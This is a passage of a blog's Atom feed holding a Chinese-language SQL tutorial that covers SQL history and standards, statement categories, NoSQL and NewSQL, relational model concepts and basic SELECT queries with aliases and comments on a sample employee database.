<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mars</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-11-27T09:39:07.656Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Fly Hugh</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>SQL 从入门到精通</title>
    <link href="http://yoursite.com/2019/11/27/GitChat%20SQL%E8%AF%BE%E7%A8%8B/"/>
    <id>http://yoursite.com/2019/11/27/GitChat SQL课程/</id>
    <published>2019-11-27T07:06:32.174Z</published>
    <updated>2019-11-27T09:39:07.656Z</updated>
    
    <content type="html"><![CDATA[<p>SQL是一项重要的技能，可能是普通程序员在工作中最常用的。面试的时候造飞机大炮，最后可能还是得实实在在得写SQL。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cm9vd6brj20sg09hq9w.jpg" alt="SQL-1024x341.png"></p><a id="more"></a> <h1 id="Structured-Query-Language"><a href="#Structured-Query-Language" class="headerlink" title="Structured Query Language"></a>Structured Query Language</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>1970 年 IBM 的 E.F. Codd 博士发表了论文《A Relational Model of Data for Large Shared Data Banks》并创建了关系模型，通过一个简单的数据结构（关系，也就是二维表）来实现数据的存储。 </p><p>1979 年 Relational Software, Inc.（后来改名为 Oracle）发布了第一个商用的关系数据库产品。随后出现了大量的关系数据库管理系统，包括 MySQL、SQL Server、PostgreSQL 以及大数据分析平台 Apache Hive、Spark SQL、Presto 等。至今，关系数据库仍然是数据库领域的主流。 </p><p>以下是著名的数据库系统排名网站 <a href="https://db-engines.com/en/ranking" target="_blank" rel="noopener">DB-Engines</a> 上各种数据库的排名情况，关系数据库占据了绝对的优势。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmdeqm4cj20rl0abq43.jpg" alt="undefined"></p><p>SQL（Structured Query Language，结构化查询语言）是访问和操作关系数据库的标准语言。只要是关系数据库，都可以使用 SQL 进行访问和控制。SQL 同样由 IBM 在 1970 年代开发，1986 年成为 ANSI 标准，并且在 1987 年成为 ISO 标准。SQL 标准随后经历了多次修订，最新的版本为 SQL:2019，增加了多维数组（MDA）的支持。下图是 SQL 标准的发展历程和主要的新增功能。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmdrn7cdj21ln0ml46x.jpg" alt="undefined"></p><p>对于 SQL 标准，人们最熟悉的就是 SQL92 或者 SQL99。但实际上经过多次修改，SQL 早已不是 40 年前的 SQL；如今它已经相当完备，功能强大，并且能够同时支持关系模型和非关系（XML、JSON）模型。具体来说，最新的 SQL 标准包含 10 个部分：</p><ul><li>ISO/IEC 9075-1 信息技术 – 数据库语言 – SQL – 第1部分：框架（SQL/框架）</li><li>ISO/IEC 9075-2 信息技术 – 数据库语言 – SQL – 第2部分：基本原则（SQL/基本原则）</li><li>ISO/IEC 9075-3 信息技术 – 数据库语言 – SQL – 第3部分：调用级接口（SQL/CLI）</li><li>ISO/IEC 9075-4 信息技术 – 数据库语言 – SQL – 第4部分：持久存储模块（SQL/PSM）</li><li>ISO/IEC 9075-9 信息技术 – 数据库语言 – SQL – 第9部分：外部数据管理（SQL/MED）</li><li>ISO/IEC 9075-10 信息技术 – 数据库语言 – SQL – 第10部分：对象语言绑定（SQL/OLB）</li><li>ISO/IEC 9075-11 信息技术 – 数据库语言 – SQL – 第11部分：信息与定义概要（SQL/Schemata）</li><li>ISO/IEC 9075-13 信息技术 – 数据库语言 – SQL – 第13部分：使用 Java 编程语言的 SQL 程序与类型（SQL/JRT）</li><li>ISO/IEC 9075-14 信息技术 – 数据库语言 – SQL – 第14部分：XML 相关规范（SQL/XML）</li><li>ISO/IEC 9075-15 信息技术 – 数据库语言 – SQL – 第15部分：多维数组（SQL/MDA）</li></ul><p>为了便于学习，通常将主要的 SQL 语句分为以下几个类别：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cme6q6syj21ir0k5gs0.jpg" alt="undefined"></p><ul><li><strong>DQL</strong>（data query language），<strong>数据查询语言</strong>；也就是 SELECT 语句，用于查询数据库中的数据和信息。</li><li><strong>DML</strong>（data manipulation language），<strong>数据操作语言</strong>；用于对表中的数据进行增加（INSERT）、修改（UPDATE）、删除（DELETE）以及合并（MERGE）操作。</li><li><strong>DDL</strong>（data definition language），<strong>数据定义语言</strong>；主要用于定义数据库中的对象（例如表或索引），包括创建对象（CREATE）、修改对象（ALTER）和删除对象（DROP）等。</li><li><strong>TCL</strong>（transaction control language），<strong>事务控制语言</strong>；用于管理数据库的事务，主要包括启动一个事务（BEGIN TRANSACTION）、提交事务（COMMIT）、回退事务（ROLLBACK）和事务保存点（SAVEPOINT）。</li><li><strong>DCL</strong>（data control language），<strong>数据控制语言</strong>；用于控制数据的访问权限，主要有授权（GRANT）和撤销（REVOKE）。</li></ul><p>SQL 是一种标准，不同厂商基于 SQL 标准实现了自己的数据库产品，例如 Oracle、MySQL 等。这些数据库都在一定程度上兼容 SQL 标准，具有一定的可移植性。但另一方面，它们都存在许多专有的扩展，没有任何一种产品完全遵循标准。 </p><h4 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h4><p>随着互联网的发展和大数据的兴起，出现了各种各样的非关系（NoSQL）数据库。NoSQL 代表 <strong>Not only SQL</strong>，表明它是针对传统关系数据库的补充和升级，而不是为了替代关系数据库。</p><p>NoSQL 数据库主要用于解决关系数据库在某些特定场景下的局限性，比如海量存储和水平扩展；但同时也会为此牺牲某些关系数据库的特性，例如对事务强一致性的支持和标准 SQL 接口。因此，这类数据库主要用于对一致性要求不是非常严格的互联网业务。常见的 NoSQL 数据库可以分为以下几类：</p><ul><li>文档数据库，例如 <a href="https://www.mongodb.com/" target="_blank" rel="noopener">MongoDB</a>（MongoDB 4.0 增加了多文档事务的特性）；</li><li>键值存储，例如 <a href="https://redis.io/" target="_blank" rel="noopener">Redis</a>；</li><li>全文搜索引擎，例如 <a href="https://www.elastic.co/products/elasticsearch" target="_blank" rel="noopener">Elasticsearch</a>；</li><li>宽列存储数据库，例如 <a href="http://cassandra.apache.org/" target="_blank" rel="noopener">Cassandra</a>；</li><li>图形数据库，例如 <a href="https://neo4j.com/" target="_blank" rel="noopener">Neo4J</a>。</li></ul><p>另一方面，关系数据库也在积极拥抱变化，添加了许多非关系模型（XML 和 JSON）支持。以最流行的开源关系数据库 MySQL 为例，最新的 MySQL 8.0 版本增加了 JSON 文档存储的支持，并且推出了一个新的概念：NoSQL + SQL = MySQL。以下是 MySQL 官方的宣传图。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmfau87wj20c80el74n.jpg" alt="undefined"></p><p>Oracle、SQL Server 以及 PostgreSQL 同样也进行了类似的扩展，可以支持原生的 XML 和 JSON 数据，并且提供了许多标准的 SQL 接口。</p><h4 id="NewSQL"><a href="#NewSQL" class="headerlink" title="NewSQL"></a>NewSQL</h4><p>中国有句古话：<strong>天下大势，合久必分，分久必合</strong>。数据库领域的发展也印证了这一规律，为了同时获得关系数据库对于事务的支持和标准的 SQL 接口，以及非关系数据库的高度扩展性和高性能。如今市场上已经出现了一类新型关系型数据库系统：NewSQL 数据库。</p><p>比较有代表性的 NewSQL 数据库包括 Google Spanner、VoltDB、PostgreSQL-XL 以及国产的 TiDB。这类新型数据库是数据库领域最新的发展方向，有志于在数据库行业发展的同学可以加以关注。</p><h4 id="为什么要学习-SQL？"><a href="#为什么要学习-SQL？" class="headerlink" title="为什么要学习 SQL？"></a>为什么要学习 SQL？</h4><p>让我们回到专栏的主题，为什么要学习 SQL 呢？简单来说，因为有用。下图是 Stack Overflow 在 2019 年关于最流行编程技术的调查结果。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmfl8agzj20nc0ict9f.jpg" alt="undefined"></p><p>作为数据处理领域的专用语言，SQL 排在了第三位，超过 50% 的开发者都需要使用到 SQL。那么，具体什么职位需要使用 SQL，用 SQL 来做什么？</p><ul><li><strong>数据分析师</strong>：显然这是一群依靠分析数据为生的人，必不可少需要与数据库打交道，SQL 是他们必备技能之一。</li><li><strong>数据科学家</strong>：与数据分析师一样，数据科学家的日常工作也离不开数据的处理，不可避免需要使用 SQL。</li><li><strong>数据库开发工程师</strong>：这个职位基本就是写 SQL 代码，实现业务逻辑。</li><li><strong>数据库管理员</strong>：也就是 DBA，主要职责是管理和维护数据库，除了会写 SQL，还需要负责审核开发人员编写的 SQL 代码。</li><li><strong>后端工程师</strong>：后端开发必然需要涉及数据的处理，需要通过 SQL 与数据库进行交互。</li><li><strong>全栈工程师</strong>：既然是全栈，自然包括后端数据的处理。</li><li><strong>移动开发工程师</strong>：作为一名移动开发工程师，一定对 SQLite 数据库不会陌生，它是在移动设备中普遍存在的嵌入式数据库。</li><li><strong>产品经理</strong>：产品经理需要了解产品的情况，而数据是最好的说明方式，了解 SQL 非常有利于对产品的把握。</li></ul><p>SQL 不但应用广泛，而且简单易学。因为它在设计之初就考虑了非技术人员的使用需求，SQL 语句全都是由简单的英语单词组成，使用者只需要声明自己想要的结果，而将具体的实现过程交给数据库管理系统。</p><p>学习编程，你可能会犹豫选择 C++ 还是 Java；入门数据科学，你可能会纠结于选择 Python 还是 R；但无论如何，SQL 都是 IT 从业人员不可或缺的一项技能！</p><p>本专栏主要讨论 SQL 编程技术和思想，分为四个部分：基础篇、进阶篇、开发篇以及扩展篇。 </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmg49ezgj20qx0k575o.jpg" alt="undefined"></p><p><strong>第一部分：基础篇</strong>。首先介绍数据库领域的最新发展，回顾数据库和 SQL 的核心概念；然后讨论如何使用 SELECT 语句查询数据，过滤数据、对结果进行排序、实现排行榜与分页效果；同时还会介绍常见的 SQL 函数、CASE 表达式以及数据的分组汇总；最后是一个分析世界银行全球 GDP 数据的实战案例。</p><p><strong>第二部分：进阶篇</strong>。主要包括 SQL 数据分析的一些高级功能：空值的问题、多表连接查询、子查询、集合运算、通用表表达式与递归查询、高级分组与多维度交叉分析、窗口函数与高级报表以及基于行模式识别的数据流分析等。</p><p><strong>第三部分：开发篇</strong>。讲述数据库设计与开发过程中涉及到的一些实用知识。包括如何设计规范化的数据库、如何管理数据库对象、如何对数据进行增删改、数据库事务的概念、索引的原理；同时还会介绍视图的概念、如何使用存储过程实现业务逻辑以及如何利用触发器实现用户操作的审计。</p><p><strong>第四部分：扩展篇</strong>。我们将分析 SQL 语句的执行计划与查询语句的优化、使用 SQL 处理 JSON 数据、在 Python 和 Java 中执行 SQL 语句，并介绍动态语句和 SQL 注入攻击的预防。在专栏的最后，我们将探讨一下 SQL 编程中的道与术。</p><h2 id="SQL的世界里一切都是关系"><a href="#SQL的世界里一切都是关系" class="headerlink" title="SQL的世界里一切都是关系"></a>SQL的世界里一切都是关系</h2><p>本篇我们将会介绍 SQL 的基本特性以及最重要的一个编程思想：<strong>一切都是关系</strong>。让我们先来回顾一下关系数据库的几个基本概念。 </p><p>关系数据库<br>关系数据库（Relational database）是指基于关系模型的数据库。关系模型由关系数据结构、关系操作集合、关系完整性约束三部分组成。<br>数据结构<br>在关系模型中，用于存储数据的逻辑结构称为关系（Relation）；对于使用者而言，关系就是二维表（Table）。<br>以下是一个员工信息表，它和 Excel 表格非常类似，由行（Row）和列（Column）组成。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmm39ukfj20gi061q37.jpg" alt="undefined"></p><p>在不同的场景下，大家可能会听到关于同一个概念的不同说法。在此，我们列出了关系数据库中的一些常见概念：</p><ul><li><strong>关系</strong>，也称为<strong>表</strong>，用于表示现实世界中的实体（Entity）或者实体之间的联系（Relationship）。举例来说，一个公司的员工、部门和职位都是实体，分别对应员工信息表、部门信息表和职位信息表；销售的产品和订单都是实体，同时它们之间存在联系，对应订单明细表。</li><li><strong>行</strong>，也称为<strong>记录</strong>（Record），代表了关系中的单个实体。上图中工号为 4 的数据行存储了“诸葛亮”的相关信息。关系（表）可以看作是由行组成的集合。</li><li><strong>列</strong>，也称为<strong>字段</strong>（Field），表示实体的某个属性。上图中的第二列包含了员工的姓名。表中的每个列都有一个对应的数据类型，常见的数据类型包括字符类型、数字类型、日期时间类型等。</li></ul><p>有了关系结构之后，就需要定义基于关系的数据操作。</p><p>操作集合</p><p>常见的数据操作包括<strong>增加</strong>（Create）、<strong>查询</strong>（Retrieve）、<strong>更新</strong>（Update）以及<strong>删除</strong>（Delete），或者统称为<strong>增删改查</strong>（CRUD）。</p><p>其中，使用最多、也最复杂的操作就是查询，具体来说包括<strong>选择</strong>（Selection）、<strong>投影</strong>（Projection）、<strong>并集</strong>（Union）、<strong>交集</strong>（Intersection）、<strong>差集</strong>（exception）以及<strong>笛卡儿积</strong>（Cartesian product）等。我们将会介绍如何使用 SQL 语句完成以上各种数据操作。</p><p>为了维护数据的完整性或者满足业务需求，关系模型还定义了完整性约束。</p><p>关系性约束</p><p>关系模型中定义了三种完整性约束：<strong>实体完整性</strong>、<strong>参照完整性</strong>以及<strong>用户定义完整性</strong>。</p><ul><li><strong>实体完整性</strong>是指表的主键字段不能为空。现实中的每个实体都具有唯一性，比如每个人都有唯一的身份证号；在关系数据库中，这种唯一标识每一行数据的字段称为主键（Primary Key），主键字段不能为空。每个表可以有且只能有一个主键。</li><li><strong>参照完整性</strong>是指外键参照的完整性。外键（Foreign Key）代表了两个表之间的关联关系，比如员工属于某个部门；因此员工表中存在部门编号字段，引用了部门表中的部门编号字段。对于外键引用，被引用的数据必须存在，员工不可能属于一个不存在的部门；删除某个部门之前，也需要对部门中的员工进行相应的处理。</li><li><p><strong>用户定义完整性</strong>是指基于业务需要自定义的约束。非空约束（NOT NULL）确保了相应的字段不会出现空值，例如员工一定要有姓名；唯一约束（UNIQUE）用于确保字段中的值不会重复，每个员工的电子邮箱必须唯一；检查约束（CHECK）可以定义更多的业务规则。例如，薪水必须大于 0 ，字符必须大写等；默认值（DEFAULT）用于向字段中插入默认的数据。</p><p>本专栏涉及的 4 种数据库对于这些完整性约束的支持情况如下： </p></li></ul><table><thead><tr><th style="text-align:left">数据库</th><th style="text-align:left">非空约束</th><th style="text-align:left">唯一约束</th><th style="text-align:left">主键约束</th><th style="text-align:left">外键约束</th><th style="text-align:left">检查约束</th><th style="text-align:left">默认值</th></tr></thead><tbody><tr><td style="text-align:left"><strong>Oracle</strong></td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td></tr><tr><td style="text-align:left"><strong>MySQL</strong></td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持*</td><td style="text-align:left">支持*</td><td style="text-align:left">支持</td></tr><tr><td style="text-align:left"><strong>SQL Server</strong></td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td></tr><tr><td style="text-align:left"><strong>PostgreSQL</strong></td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td><td style="text-align:left">支持</td></tr></tbody></table><p>MySQL 中只有 InnoDB 存储引擎支持外键约束；MySQL 8.0.16 增加了对检查约束的支持。</p><blockquote><p>存储引擎（Storage Engine）是 MySQL 中用于管理、访问和修改物理数据的组件，不同的存储引擎提供了不同的功能和特性。从 MySQL 5.5 开始默认使用 InnoDB 存储引擎，支持事务处理（ACID）、行级锁定、故障恢复、多版本并发控制（MVCC）以及外键约束等。</p></blockquote><p>关系数据库使用 SQL 作为访问和操作数据的标准语言。现在，让我们来直观感受一下 SQL 语句的特点。</p><p>SQL：一种面向集合的编程语言</p><blockquote><p>本节会出现几个示例，我们还没有正式开始学习 SQL 语句，可以暂时不必理会细节。</p></blockquote><p>语法特性</p><p>SQL 是一种声明性的编程语言，语法接近于自然语言（英语）。通过几个简单的英文单词，例如 SELECT、INSERT、UPDATE、CREATE、DROP 等，完成大部分的数据库操作。以下是一个简单的查询示例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> emp_id, emp_name, salary</span><br><span class="line">  <span class="keyword">FROM</span> employee</span><br><span class="line"> <span class="keyword">WHERE</span> salary &gt; <span class="number">10000</span></span><br><span class="line"> <span class="keyword">ORDER</span> <span class="keyword">BY</span> emp_id;</span><br></pre></td></tr></table></figure><p>即使没有学过 SQL 语句，但只要知道几个单词的意思，就能明白该语句的作用。它查询员工表（employee）中月薪（salary）大于 10000 的员工，返回工号、姓名以及月薪，并且按照工号进行排序。可以看出，SQL 语句非常简单直观。</p><p>以上查询中的 SELECT、FROM 等称为关键字（也称为子句），一般大写；表名、列名等内容一般小写；分号（;）表示语句的结束。SQL 语句不区分大小写，但是遵循一定的规则可以让代码更容易阅读。</p><blockquote><p>SQL 是一种声明式的语言，声明式语言的主要思想是告诉计算机想要什么结果（what），但不指定具体怎么做。这类语言还包括 HTML、正则表达式以及函数式编程等。</p></blockquote><p>面向集合</p><p>对于 SQL 语句而言，它所操作的对象是一个集合（表），操作的结果也是一个集合（表）。例如以下查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> emp_id, emp_name, salary</span><br><span class="line">  <span class="keyword">FROM</span> employee;</span><br></pre></td></tr></table></figure><p>其中 employee 是一个表，它是该语句查询的对象；同时，查询的结果也是一个表。所以，我们可以继续扩展该查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> emp_id, emp_name, salary</span><br><span class="line">  <span class="keyword">FROM</span> (</span><br><span class="line">       <span class="keyword">SELECT</span> emp_id, emp_name, salary</span><br><span class="line">         <span class="keyword">FROM</span> employee</span><br><span class="line">       ) dt;</span><br></pre></td></tr></table></figure><p>我们将括号中的查询结果（取名为 dt）作为输入值，传递给了外面的查询；最终整个语句的结果仍然是一个表。在第 17 篇中，我们将会介绍这种嵌套在其他语句中的查询就是子查询（Subquery）。</p><p>SQL 中的查询可以完成各种数据操作，例如过滤转换、分组汇总、排序显示等；但是它们本质上都是针对表的操作，结果也是表。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cmy2e08yj217a093wf1.jpg" alt="undefined"></p><p>不仅仅是查询语句，SQL 中的插入、更新和删除都以集合为操作对象。我们再看一个插入数据的示例： </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> t(<span class="keyword">id</span> <span class="built_in">INTEGER</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 适用于 MySQL、SQL Server 以及 PostgreSQL</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> t(<span class="keyword">id</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="number">1</span>), (<span class="number">2</span>), (<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>我们首先使用 CREATE TABLE 语句创建了一个表，然后使用 INSERT INTO 语句插入数据。在执行插入操作之前，会在内存中创建一个包含 3 条数据的临时集合（表），然后将该集合插入目标表中。由于我们通常一次插入一条数据，以为是按照数据行进行插入；实际上，一条数据也是一个集合，只不过它只有一个元素而已。</p><p>Oracle 不支持以上插入<strong>多行数据</strong>的语法，可以使用下面的插入语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 适用于 Oracle</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> t(<span class="keyword">id</span>)</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> DUAL</span><br><span class="line"> <span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">2</span> <span class="keyword">FROM</span> DUAL</span><br><span class="line"> <span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">3</span> <span class="keyword">FROM</span> DUAL;</span><br></pre></td></tr></table></figure><p>UNION ALL 是 SQL 中的并集运算，用于将两个集合组成一个更大的集合。此外，SQL 还支持交集运算（INTERSECT）、差集运算（EXCEPT）以及笛卡儿积（Cartesian product）。我们会在第 18 篇中介绍这些内容，它们也都是以集合为对象的操作。</p><p>我们已经介绍了 SQL 语言的声明性和面向集合的编程思想。在正式学习编写 SQL 语句之前，还需要进行一些准备工作，主要就是安装示例数据库。</p><p>示例数据库</p><p>在本专栏的学习过程中，我们主要使用一个虚构的公司数据模型。该示例数据库包含 3 个表：员工表（employee）、部门表（department）和职位表（job）。以下是它们的结构图，也称为<strong>实体-关系图</strong>（Entity-Relational Diagram）：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cnhvzfk5j20e908y0sw.jpg" alt="undefined"></p><ul><li><strong>部门表</strong>（department），包含部门编号（dept<em>id）和部门名称（dept</em>name）字段，主键为部门编号。该表共计 6 条数据。</li><li><strong>职位表</strong>（job），包含职位编号（job<em>id）和职位名称（job</em>title）字段，主键为职位编号。该表共计 10 条数据。</li><li><strong>员工表</strong>（employee），包含员工编号（emp<em>id）和员工姓名（emp</em>name）等字段，主键为员工编号，部门编号（dept<em>id）字段是引用部门表的外键，职位编号（job</em>id）字段是引用职位表的外键，经理编号（manager）字段是引用员工表自身的外键。该表共计 25 条数据。</li></ul><p>我们在 GitHub 上为大家提供了示例表和初始数据的创建脚本和安装说明，支持 Oracle、MySQL、SQL Server 以及 PostgreSQL。点击<a href="https://github.com/dongxuyang1985/thinking_in_sql" target="_blank" rel="noopener">链接</a>进行下载。</p><p>运行这些脚本之前，需要先安装数据库软件。网络上有很多这类安装教程可以参考；如果无法安装数据库，也可以使用这个免费的在线 SQL 开发环境：<a href="http://sqlfiddle.com/" target="_blank" rel="noopener">http://sqlfiddle.com</a>，它提供了各种常见的关系数据库服务。下图是使用 MySQL 运行示例脚本的结果：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cnigeozjj20zk0gbdhp.jpg" alt="undefined"></p><p>选择数据库之后，将创建表和插入数据的脚本复制到左边窗口，点击“Build Schema”进行初始化；点击“Browser”可以查看表结构；在右侧窗口输入 SQL 语句，点击“Run SQL”运行并查看结果。该工具提供的数据库不是最新版本，但是可以运行大部分的示例。</p><p>本专栏中所有的示例都在以下数据库版本中进行了验证：</p><ul><li>Oracle database 18c</li><li>MySQL 8.0</li><li>SQL Server 2017</li><li>PostgreSQL 12</li></ul><p>我们使用 <a href="https://dbeaver.io/" target="_blank" rel="noopener">DBeaver</a> 开发工具编写所有的 SQL 语句，该工具的安装和使用可以参考我的<a href="https://tonydong.blog.csdn.net/article/details/89683422" target="_blank" rel="noopener">博客文章</a>。当然，你也可以使用自己喜欢的开发工具。</p><p>小结</p><p>关系模型中定义了一个简单的数据结构，即关系（表），用于存储数据。SQL 是关系数据库的通用标准语言，它使用接近于自然语言（英语）的语法，通过声明的方式执行数据定义、数据操作、访问控制等。对于 SQL 而言，一切都是关系（表）。</p><p>参考文献</p><ul><li>[美] Abraham Silberschatz，Henry F.Korth，S.Sudarshan 著，杨冬青，李红燕，唐世渭 译 ，《数据库系统概念（原书第6版）》，机械工业出版社，2012</li></ul><h2 id="SELECT-初步探索"><a href="#SELECT-初步探索" class="headerlink" title="SELECT 初步探索"></a>SELECT 初步探索</h2><p>在 employee 表中，存储了关于员工的信息。假设现在打算群发邮件，需要找出所有员工的姓名、性别和电子邮箱。在 SQL 中可以通过一个简单的查询语句来实现：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> emp_name, sex, email</span><br><span class="line">  <span class="keyword">FROM</span> employee;</span><br></pre></td></tr></table></figure><p>其中 SELECT 表示查询，随后列出需要返回的字段，多个字段使用逗号分隔；FROM 表示要从哪个表中进行查询；分号表示 SQL 语句的结束。该语句执行的结果如下（显示部分数据）：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9coidg6c2j20ae06mweo.jpg" alt="undefined"></p><p>这种查询表中指定字段的操作在关系运算中被称为<strong>投影</strong>（Projection），使用 SELECT 子句进行表示。投影是针对表进行的垂直选择，保留需要的字段用于生成新的表。以下是投影操作的示意图： </p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9coj8sb0sj20yd0ikmy4.jpg" alt="undefined"></p><p>投影操作中包含一个特殊的操作，就是查询表中所有的字段。</p><h3 id="查询全部字段"><a href="#查询全部字段" class="headerlink" title="查询全部字段"></a>查询全部字段</h3><p>查看表中的全部字段可以使用一个简单的写法，就是使用星号（*）表示全部字段。例如，以下语句查询员工表中的所有数据：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * </span><br><span class="line">  <span class="keyword">FROM</span> employee;</span><br></pre></td></tr></table></figure><p>数据库在解析该语句时，会使用表中的字段名进行扩展：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> emp_id, emp_name, sex, dept_id, manager,</span><br><span class="line">       hire_date, job_id, salary, bonus, email</span><br><span class="line">  <span class="keyword">FROM</span> employee;</span><br></pre></td></tr></table></figure><p>该语句执行的结果如下（显示部分数据）：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cojmu3vkj20th06m74w.jpg" alt="undefined"></p><blockquote><p><strong>注意</strong>：星号可以便于快速编写查询语句，但是在实际项目中不要使用这种写法。因为应用程序可能并不需要所有的字段，避免返回过多的无用数据；另外，当表结构发生变化时，星号返回的信息也会发生改变。 </p></blockquote><p>除了查询表的字段之外，SELECT 语句还支持扩展的投影操作，包括基于字段的算术运算、函数和表达式等。</p><p>扩展操作</p><p>以下示例返回了员工的姓名、一年的工资（12 个月的月薪）以及电子邮箱的大写形式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> emp_name,</span><br><span class="line">       salary * <span class="number">12</span>,</span><br><span class="line">       <span class="keyword">UPPER</span>(email)</span><br><span class="line">  <span class="keyword">FROM</span> employee;</span><br></pre></td></tr></table></figure><p>其中 UPPER 是 SQL 中将字符串转换为大写的函数，函数将在第 8 篇中进行介绍。该语句的结果如下（显示部分数据）：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9cokqdusej20cl06mt91.jpg" alt="undefined"></p><p>在上面的结果中，返回字段的名称不是很好理解；能不能给它指定一个更明确的标题呢？这就需要使用到 SQL 中的别名（Alias）功能了。</p><h3 id="使用别名"><a href="#使用别名" class="headerlink" title="使用别名"></a>使用别名</h3><p>为了提高查询结果的可读性，可以使用别名为表或者字段指定一个临时的名称。SQL 中使用关键字 AS 指定别名。我们为上面的示例指定一些更好理解的标题：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> e.emp_name <span class="keyword">AS</span> <span class="string">"姓名"</span>,</span><br><span class="line">       salary * <span class="number">12</span> <span class="keyword">AS</span> <span class="string">"工资"</span>,</span><br><span class="line">       <span class="keyword">UPPER</span>(email) <span class="string">"电子邮箱"</span></span><br><span class="line">  <span class="keyword">FROM</span> employee <span class="keyword">AS</span> e; <span class="comment">-- Oracle 需要去掉此处的 AS</span></span><br></pre></td></tr></table></figure><blockquote><p>别名中的关键字 AS 可以省略。对于 Oracle 而言，表别名不支持 AS 关键字，省略掉即可。</p></blockquote><p>首先，我们为 employee 表指定了一个表别名 e；然后为查询的结果字段指定了 3 个更明确的列别名（使用双引号）。在查询中为表指定别名之后，引用表中的字段时可以加上别名限定，例如 e.emp_name，表示要查看哪个表中的字段。以下是使用别名之后的效果：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g9col02qedj20ah06m74l.jpg" alt="undefined"></p><p>在 SQL 语句中使用别名不会修改数据库中存储的表名或者列名，别名只在当前语句中生效。</p><p>在上面的示例中，我们还用到了 SQL 中的另一个功能：注释。</p><h3 id="SQL-注释"><a href="#SQL-注释" class="headerlink" title="SQL 注释"></a>SQL 注释</h3><p>在 SQL 中可以像其他编程语言一样使用注释；注释可以方便我们理解代码的作用，但不会被执行。</p><p>SQL中的注释分为单行注释和多行注释。单行注释以两个连字符（–）开始，直到这一行结束；上一节中的示例就使用了单行注释。SQL 使用 C 语言风格的多行注释（/<em> … </em>/），例如：</p><figure class="highlight sql"><table><tr><td 